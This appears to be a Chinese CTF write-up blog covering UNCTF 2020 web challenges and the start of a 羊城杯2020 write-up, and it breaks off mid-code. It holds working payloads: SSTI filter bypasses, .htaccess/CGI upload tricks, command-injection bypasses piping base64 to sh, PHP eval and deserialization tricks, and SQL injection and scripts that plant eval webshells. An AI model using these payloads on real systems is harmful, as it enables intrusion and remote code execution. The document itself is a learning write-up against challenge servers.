<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)|attr((request.args.usc*2,request.args.init,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.import,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;init&#x3D;init&amp;globals&#x3D;globals&amp;builtins&#x3D;builtins&amp;import&#x3D;import</span><br></pre></td></tr></table></figure>
<p><code>().__class__.base__.subclasses().pop(64).__init__.__globals__.__import__</code><br>
还是没能搞出来<br>
最后还是通过读文件的方式，首先尝试<code>proc/self/cwd</code>和<code>/proc/self/environ</code>，直接返回500，应该是权限不够，再尝试读取<code>/proc/self/cmdline</code>，显示项目是在<code>/app</code>下面，再看<code>/app/app.py</code>发现可以成功读取源码，那就猜了一波flag应该在这个路径下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;app&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>参考：<br>
<a href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a><br>
<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#flask-%E6%94%B9">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#flask-改</a><br>
<a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a><br>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---filter-bypass</a></p>
<p>赛后看预期解我好像做的太麻烦了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;((session|attr(request.headers.x))|attr(request.headers.x1)).get(request.headers.x2).get(request.headers.x3)(request.headers.x4).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>header的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x: __init__</span><br><span class="line">x1: __globals__</span><br><span class="line">x2: __builtins__</span><br><span class="line">x3: open</span><br><span class="line">x4: app.py(flag.txt)</span><br></pre></td></tr></table></figure>
<h2 id="easyunserialize-solved">easyunserialize [solved]</h2>
<p>反序列化字符逃逸<br>
Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="babyeval-solved">babyeval [solved]</h2>
<p>命令执行可以直接包含文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;include&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="easyfind-solved">easyfind [solved]</h2>
<p>一开始不给hint都没什么思路，后来放了一个hint：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="literal">false</span>))&#123;flag&#125;<span class="keyword">else</span>&#123;no flag&#125;</span><br></pre></td></tr></table></figure>
<p>is_file函数接收一个数组的时候回返回Null</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name[]&#x3D;0</span><br></pre></td></tr></table></figure>
<h2 id="easy-upload-solved">easy_upload [solved]</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119105131.png" alt=""></p>
<p>检查文件名后缀、文件类型，过滤了<code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet</code>，不检查是否有图片头。</p>
<p><code>.htaccess</code>文件名是可以上传的，用换行绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">ph5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file &#x2F;flag</span><br></pre></td></tr></table></figure>
<p>然后在随便上传一个txt文件，访问对应路径即可。</p>
<p>然后我写wp的时候发现，这道题目过滤被改了，增加了一个<code>\</code>，所以上面的这种换行绕过就没办法bypass了。</p>
<p>来学一个新姿势，上传.htaccess，开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119130328.png" alt=""></p>
<p>再上传cgi文件，这个文件必须要在Linux/macOS环境下编写，使用vim就行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>然后上传的时候最好也要直接上传文件，抓包修改文件类型，最后再放包，不然可能会出现500的错误。</p>
<h2 id="UN’s-online-tools-solved">UN’s_online_tools [solved]</h2>
<p>命令执行绕过的题目，当前目录下只有index.php，用sort读取源代码，过滤空格和<code>$</code>，用<code>%09</code>来绕过。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119131410.png" alt=""></p>
<p>从源码中可以看到禁用了<code>/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i</code></p>
<p>用ls命令看到flag在根目录下，base64编码一下</p>
<p><code>127.0.0.1|echo%09Y2F0IC9mbGFn|base64%09-d|sh</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119133907.png" alt=""></p>
<h2 id="easyphp">easyphp</h2>
<p>PHP代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;fuxkSQL&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span>(<span class="params">$iText</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getVars&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题考点是变量覆盖，弱类型和PHP复杂变量的解析。做出了前两个考点，倒在了第三个考点，没想到用复杂变量。</p>
<p>第一关</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$&#123;$key&#125;=$value</code>可以导致变量覆盖，也就是说我们将$password覆盖为任意值，然后将$adminPassword覆盖为其md5值。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;ca01h&amp;adminPassword&#x3D;0f5ed8a8d8d44d86a570aacffa922251&amp;source&#x3D;</span><br></pre></td></tr></table></figure>
<p>第二关</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure>
<p>简单的PHP弱类型绕过，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?verif&#x3D;0e00000000000000000000081614617300000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></p>
</blockquote>
<p>第三关</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>变量名必须是<code>var1</code>或者<code>var12</code>这种形式，而且在变量覆盖环节转义了单双引号。</p>
<p>关于复杂变量的解析：<a href="https://ca0y1h.top/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/">https://ca0y1h.top/Web_security/php_related/11.PHP复杂变量解析/</a></p>
<p>Payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1=&#123;$_GET[<span class="number">1</span>]&#125;&amp;var3=$&#123;$var1()&#125;&amp;<span class="number">1</span>=phpinfo</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$var1&#x3D;&quot;&#123;$_GET[1]&#125;&quot;; &#x3D;&#x3D;&gt; $var1&#x3D;&quot;phpinfo&quot;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$var3&#x3D;&quot;$&#123;$var1()&#125;&quot;; &#x3D;&#x3D;&gt; $var3&#x3D;&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="L0vePHP">L0vePHP</h2>
<p>查看源码最后一行是一个提示，但是比赛的时候不知道这是base82的编码方式。</p>
<p>解码之后是让提交一个action参数，提示读源码，用文件包含，base被过滤了，换成rot13。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.string-rot13&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/base|data|input|zip|zlib/i&quot;</span>, $action)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$action</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $flag = <span class="string">&quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>hint用十六进制转码<code>1nD3x.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>);</span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>预期解，利用PHP5.6新引入的特性——变长参数</p>
<p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p>
<p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1[]&#x3D;test&amp;1[]&#x3D;system(%27ls%20&#x2F;%27);&amp;2&#x3D;assert</span><br><span class="line">POST</span><br><span class="line">code&#x3D;usort(...$_GET);</span><br></pre></td></tr></table></figure>
<p>也就是相当于执行了<code>usort([&quot;test&quot;, &quot;system('ls /');&quot;], assert);</code></p>
<p>P年的那篇文章还提到了可以利用文件包含写shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure>
<p>用脚本自动跑一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbOV0pOw&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = <span class="string">&quot;http://fda5225d-9b6e-4633-985e-7b0fca4a99ac.node1.hackingfor.fun/1nD3x.php?code=$_GET[a](A,&#123;&#125;,8);&amp;a=file_put_contents&quot;</span>.format(s)</span><br><span class="line">    print(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="comment"># print(res.status_code)</span></span><br></pre></td></tr></table></figure>
<p>base64编码后的一句话已经写入了A文件，再文件包含这个A文件。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201118212038.png" alt=""></p>
<h2 id="俄罗斯方块">俄罗斯方块</h2>
<p>题目有提示用到wasm，网上先稍微了解一下。查看源代码发现是有wasm.gz的源文件。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117220752.png" alt=""></p>
<p>拼接一下文件名下载下来解压之后拿到<code>blocks.wasm</code>，再用wabt工具集中的wasm2wat对其进行反编译</p>
<blockquote>
<p><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p>
<p><a href="https://webassembly.github.io/wabt/doc/wasm2wat.1.html">https://webassembly.github.io/wabt/doc/wasm2wat.1.html</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221818.png" alt=""></p>
<p>反编译之后打开wat文件我人都傻了，啥都看不懂，后来我把所有能用的工具试了一下，就是没想到在反编译后的文件中查找99999关键字</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221631.png" alt=""></p>
<p>再修改这个分数，最后编译成wasm文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221929.png" alt=""></p>
<p>把源码保存下来，替换掉block.wasm.gz，在本地起服务，再随便玩玩拿到flag。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117231202.png" alt=""></p>
<h2 id="ezphp">ezphp</h2>
<p>题目这样出我真的。。。。没想到</p>
<p>并不知道username和password的确切的值，要用php绕类型比较进行绕过，构造paylaod：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">True</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">True</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 得到: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure>
<p>POST参数即可得到flag</p>
<h2 id="checkin-sql">checkin-sql</h2>
<p>强网杯2019随便住魔改，提示flag不在数据库中，那么就肯定要写shell了。</p>
<p>堆叠注入查表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;;show tables;</span><br></pre></td></tr></table></figure>
<p>查表字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;;desc 0xDktb;</span><br></pre></td></tr></table></figure>
<p>用预处理和十六进制编码<code>select * from 0xDktb</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603078446b746260;prepare execsql from @a; execute execsql;</span><br></pre></td></tr></table></figure>
<p>发现被过滤掉了<code>set</code>关键字。（在比赛的时候没想到可以直接不要set语句。。。</p>
<p>改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;</span><br></pre></td></tr></table></figure>
<p>发现可以执行成功，那么直接写shell<code>select '&lt;?php @eval($_POST[ccc]);?&gt;' into outfile '/var/www/html/shell.php'</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;</span><br></pre></td></tr></table></figure>
<p>用蚁剑连接拿flag。</p>
<h2 id="赛后收获">赛后收获</h2>
<ul>
<li>flask模板注入过滤了关键字或者下划线可以用管道符+join的方式绕过；</li>
<li><code>is_file()</code>函数的参数是一个数组的时候会返回一个NULL；</li>
<li>.htaccess可以用换行的方式绕过关键字黑名单</li>
<li>接上一条，如果过滤了<code>\</code>，在.htaccess中解析某个后缀为cgi文件，再上传一个cgi文件运行后读取flag；</li>
<li>PHP复杂变量解析；</li>
<li>PHP5.6以后版本有变长参数的特性；</li>
<li>在代码注入的题目中还可以用这种方式写入shell：<code>$_GET[a](N,a,8);&amp;a=file_put_contents</code>，再用PHP伪协议读取；</li>
<li>SQL注入预编译过了<code>set</code>，可以直接用<code>prepare execsql from 0x....</code></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2020-Web-Writeups</title>
    <url>/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/</url>
    <content><![CDATA[<h1 id="羊城杯2020-Web-Writeup">羊城杯2020 Web Writeup</h1>
<p>当时没时间打，现在题目在GitHub上开源了，随便看看。</p>
<h2 id="easycon">easycon</h2>
<p>蚁剑连接一句话，下载bbbbbbbbb.txt文件，是一个少了头部分的base64编码的图片，加上头再转码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163136.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163156.png" alt=""></p>
<h2 id="easyser">easyser</h2>
<p>这题目说实在的，提示地太隐晦了，用不安全的协议读取ser.php文件，Fuzz半天发现是用<code>http://127.0.0.1/star1.php</code>读取源码。</p>
<p>ser.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 